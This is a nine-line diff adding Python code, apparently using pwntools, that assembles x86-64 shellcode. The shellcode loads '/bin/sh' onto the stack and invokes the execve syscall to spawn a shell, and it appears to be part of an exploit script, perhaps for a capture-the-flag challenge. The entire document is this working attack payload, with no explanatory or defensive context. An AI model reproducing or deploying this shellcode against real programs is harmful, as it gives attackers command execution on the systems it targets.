@@ -1,0 +1,9 @@
+shellcode = asm('\n'.join([
+    'movabs rdi, 0x68732f6e69622f', 
+    'push rdi',
+    'mov rdi, rsp',
+    'and rsi, rdx',
+    'xor rax, rax',
+    'mov al, 59',
+    'syscall',
+]))
